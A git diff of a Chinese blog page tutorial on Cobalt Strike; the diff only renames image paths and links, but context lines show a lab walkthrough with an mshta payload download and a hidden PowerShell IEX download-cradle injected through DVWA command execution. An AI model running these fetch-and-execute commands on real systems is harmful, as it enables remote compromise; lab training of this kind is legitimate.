@@ -479,54 +479,54 @@ CobaltStrike集成了端口转发">
 <pre class="line-numbers language-none"><code class="language-none">chmod +x teamserver
 sudo .&#x2F;teamserver ip password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="/2023/06/09/cobaltstrike/image-20230528223602821.png" alt="image-20230528223602821"></p>
+<p><img src="/2023/06/09/Cobaltstrike/image-20230528223602821.png" alt="image-20230528223602821"></p>
 <p>启动客户端</p>
 <pre class="line-numbers language-none"><code class="language-none">chmod +x cobaltstrike
 .&#x2F;cobaltstrike<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="/2023/06/09/cobaltstrike/image-20230528223723790.png" alt="image-20230528223723790"></p>
+<p><img src="/2023/06/09/Cobaltstrike/image-20230528223723790.png" alt="image-20230528223723790"></p>
 <p>连接成功</p>
-<p><img src="/2023/06/09/cobaltstrike/image-20230528223908610.png" alt="image-20230528223908610"></p>
-<h2 id="功能介绍"><a href="#功能介绍" class="headerlink" title="功能介绍"></a>功能介绍</h2><h3 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h3><p><img src="/2023/06/09/cobaltstrike/image-20230528224140719.png" alt="image-20230528224140719"></p>
+<p><img src="/2023/06/09/Cobaltstrike/image-20230528223908610.png" alt="image-20230528223908610"></p>
+<h2 id="功能介绍"><a href="#功能介绍" class="headerlink" title="功能介绍"></a>功能介绍</h2><h3 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h3><p><img src="/2023/06/09/Cobaltstrike/image-20230528224140719.png" alt="image-20230528224140719"></p>
 <h3 id="监听器"><a href="#监听器" class="headerlink" title="监听器"></a>监听器</h3><p>创建一个监听器</p>
-<p><img src="/2023/06/09/cobaltstrike/image-20230528224809997.png" alt="image-20230528224809997"></p>
+<p><img src="/2023/06/09/Cobaltstrike/image-20230528224809997.png" alt="image-20230528224809997"></p>
 <p>Name自己设置</p>
-<p><img src="/2023/06/09/cobaltstrike/image-20230528225233575.png" alt="image-20230528225233575"></p>
-<p><img src="/2023/06/09/cobaltstrike/image-20230529180755021.png" alt="image-20230529180755021"></p>
+<p><img src="/2023/06/09/Cobaltstrike/image-20230528225233575.png" alt="image-20230528225233575"></p>
+<p><img src="/2023/06/09/Cobaltstrike/image-20230529180755021.png" alt="image-20230529180755021"></p>
 <p>查看监听</p>
 <pre class="line-numbers language-none"><code class="language-none">netstat -anltup<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/2023/06/09/cobaltstrike/image-20230528230135243.png" alt="image-20230528230135243"></p>
+<p><img src="/2023/06/09/Cobaltstrike/image-20230528230135243.png" alt="image-20230528230135243"></p>
 <p>这样就创建好一个监听器了</p>
-<p><img src="/2023/06/09/cobaltstrike/image-20230529180929252.png" alt="image-20230529180929252"></p>
+<p><img src="/2023/06/09/Cobaltstrike/image-20230529180929252.png" alt="image-20230529180929252"></p>
 <h3 id="靶机上线"><a href="#靶机上线" class="headerlink" title="靶机上线"></a>靶机上线</h3><p>这就要使用Attack Package模块</p>
-<p><img src="/2023/06/09/cobaltstrike/image-20230528230531667.png" alt="image-20230528230531667"></p>
-<p><img src="/2023/06/09/cobaltstrike/image-20230528231929804.png" alt="image-20230528231929804"></p>
+<p><img src="/2023/06/09/Cobaltstrike/image-20230528230531667.png" alt="image-20230528230531667"></p>
+<p><img src="/2023/06/09/Cobaltstrike/image-20230528231929804.png" alt="image-20230528231929804"></p>
 <p>这里以生成 .hta .HTML应用程序为例</p>
 <p>我这里下载的是汉化的版本，建议使用不汉化的版本，懒得重新下了，所以一直用的的这个、</p>
-<p><img src="/2023/06/09/cobaltstrike/image-20230529181036249.png" alt="image-20230529181036249"></p>
-<p><img src="/2023/06/09/cobaltstrike/image-20230528232430210.png" alt="image-20230528232430210"></p>
+<p><img src="/2023/06/09/Cobaltstrike/image-20230529181036249.png" alt="image-20230529181036249"></p>
+<p><img src="/2023/06/09/Cobaltstrike/image-20230528232430210.png" alt="image-20230528232430210"></p>
 <p>这里是我选择的是 powershell</p>
 <p>生成了.hta文件</p>
-<p><img src="/2023/06/09/cobaltstrike/image-20230528232602383.png" alt="image-20230528232602383"></p>
+<p><img src="/2023/06/09/Cobaltstrike/image-20230528232602383.png" alt="image-20230528232602383"></p>
 <p>然后需要开启一个端口，供靶机下载文件</p>
-<p><img src="/2023/06/09/cobaltstrike/image-20230529181214217.png" alt="image-20230529181214217"></p>
+<p><img src="/2023/06/09/Cobaltstrike/image-20230529181214217.png" alt="image-20230529181214217"></p>
 <p>如果不是汉化版的话就是Attacks -&gt; web drive-by -&gt; host file</p>
-<p><img src="/2023/06/09/cobaltstrike/image-20230529181244643.png" alt="image-20230529181244643"></p>
-<p><img src="/2023/06/09/cobaltstrike/image-20230529181303753.png" alt="image-20230529181303753"></p>
+<p><img src="/2023/06/09/Cobaltstrike/image-20230529181244643.png" alt="image-20230529181244643"></p>
+<p><img src="/2023/06/09/Cobaltstrike/image-20230529181303753.png" alt="image-20230529181303753"></p>
 <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip:9090&#x2F;download&#x2F;file.ext<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>在虚拟机上执行这个url</p>
 <pre class="line-numbers language-none"><code class="language-none">mshta http:&#x2F;&#x2F;ip:9090&#x2F;download&#x2F;file.ext<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>然后靶机就上线了</p>
-<p><img src="/2023/06/09/cobaltstrike/image-20230529173718432.png" alt="image-20230529173718432"></p>
-<h3 id="靶机的操做"><a href="#靶机的操做" class="headerlink" title="靶机的操做"></a>靶机的操做</h3><p><img src="/2023/06/09/cobaltstrike/image-20230529181412957.png" alt="image-20230529181412957"></p>
+<p><img src="/2023/06/09/Cobaltstrike/image-20230529173718432.png" alt="image-20230529173718432"></p>
+<h3 id="靶机的操做"><a href="#靶机的操做" class="headerlink" title="靶机的操做"></a>靶机的操做</h3><p><img src="/2023/06/09/Cobaltstrike/image-20230529181412957.png" alt="image-20230529181412957"></p>
 <p>这些操做就不做演示了</p>
 <p>可以通过 attacks -&gt; web driver-by -&gt; manage查看我们进行的操做</p>
-<p><img src="/2023/06/09/cobaltstrike/image-20230529174538178.png" alt="image-20230529174538178"></p>
+<p><img src="/2023/06/09/Cobaltstrike/image-20230529174538178.png" alt="image-20230529174538178"></p>
 <p>输入 shell whoami 默认时间间隔是60s（防止被IDS查杀）  可以通过命令或者操做设置sleep时间</p>
-<p><img src="/2023/06/09/cobaltstrike/image-20230529174836112.png" alt="image-20230529174836112"></p>
+<p><img src="/2023/06/09/Cobaltstrike/image-20230529174836112.png" alt="image-20230529174836112"></p>
 <p>输入help查看有哪些命令</p>
 <pre class="line-numbers language-none"><code class="language-none">beacon&gt; help
 
@@ -629,10 +629,10 @@ Beacon Commands
 
 
 <h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><h3 id="1-设置监听器"><a href="#1-设置监听器" class="headerlink" title="1.设置监听器"></a>1.设置监听器</h3><p>设置监听器和上述步骤一样</p>
-<p><img src="/2023/06/09/cobaltstrike/image-20230608103956044.png" alt="image-20230608103956044"></p>
+<p><img src="/2023/06/09/Cobaltstrike/image-20230608103956044.png" alt="image-20230608103956044"></p>
 <h3 id="2-设置Attack"><a href="#2-设置Attack" class="headerlink" title="2.设置Attack"></a>2.设置Attack</h3><p>以Scripted Web Delivery为例</p>
-<p><img src="/2023/06/09/cobaltstrike/image-20230608104237412.png" alt="image-20230608104237412"></p>
-<p><img src="/2023/06/09/cobaltstrike/image-20230608104440319.png" alt="image-20230608104440319"></p>
+<p><img src="/2023/06/09/Cobaltstrike/image-20230608104237412.png" alt="image-20230608104237412"></p>
+<p><img src="/2023/06/09/Cobaltstrike/image-20230608104440319.png" alt="image-20230608104440319"></p>
 <p>生成powershell木马</p>
 <pre class="line-numbers language-none"><code class="language-none">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;ip:9091&#x2F;a&#39;))&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -641,15 +641,15 @@ Beacon Commands
 
 
 <h3 id="3-寻找靶机漏洞，执行命令"><a href="#3-寻找靶机漏洞，执行命令" class="headerlink" title="3.寻找靶机漏洞，执行命令"></a>3.寻找靶机漏洞，执行命令</h3><p>这里以DVWA的命令执行漏洞为例</p>
-<p><img src="/2023/06/09/cobaltstrike/image-20230608104912451.png" alt="image-20230608104912451"></p>
+<p><img src="/2023/06/09/Cobaltstrike/image-20230608104912451.png" alt="image-20230608104912451"></p>
 <p>把后面的命令换成我们上一步生成的attack 木马</p>
-<p><img src="/2023/06/09/cobaltstrike/image-20230608105327095.png" alt="image-20230608105327095"></p>
+<p><img src="/2023/06/09/Cobaltstrike/image-20230608105327095.png" alt="image-20230608105327095"></p>
 <h3 id="4-靶机上线"><a href="#4-靶机上线" class="headerlink" title="4.靶机上线"></a>4.靶机上线</h3><p>然后靶机成功上线</p>
-<p><img src="/2023/06/09/cobaltstrike/image-20230608105409789.png" alt="image-20230608105409789"></p>
-<p><img src="/2023/06/09/cobaltstrike/image-20230608105747263.png" alt="image-20230608105747263"></p>
+<p><img src="/2023/06/09/Cobaltstrike/image-20230608105409789.png" alt="image-20230608105409789"></p>
+<p><img src="/2023/06/09/Cobaltstrike/image-20230608105747263.png" alt="image-20230608105747263"></p>
 <h3 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h3><p>提权就需要我们根据靶机的系统版本等，找到对应的提权脚本进行攻击提权</p>
-<p><img src="/2023/06/09/cobaltstrike/image-20230608110131075.png" alt="image-20230608110131075"></p>
-<p><img src="/2023/06/09/cobaltstrike/image-20230608110151571.png" alt="image-20230608110151571"></p>
+<p><img src="/2023/06/09/Cobaltstrike/image-20230608110131075.png" alt="image-20230608110131075"></p>
+<p><img src="/2023/06/09/Cobaltstrike/image-20230608110151571.png" alt="image-20230608110151571"></p>
 <p>选择对应的脚本，进行提权</p>
 <h3 id="6-内网信息收集"><a href="#6-内网信息收集" class="headerlink" title="6.内网信息收集"></a>6.内网信息收集</h3><p>然后进行相应的操做</p>
 
@@ -678,7 +678,7 @@ Beacon Commands
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2023/06/09/cobaltstrike/">http://example.com/2023/06/09/cobaltstrike/</a>
+                    <a href="http://example.com/2023/06/09/Cobaltstrike/">http://example.com/2023/06/09/Cobaltstrike/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -800,7 +800,7 @@ Beacon Commands
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/06/11/an-xun-bei-quan-guo-jing-ying-sai-2023/">
+                <a href="/2023/06/11/%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%85%A8%E5%9B%BD%E7%B2%BE%E8%8B%B1%E8%B5%9B2023/">
                     <div class="card-image">
                         
                         
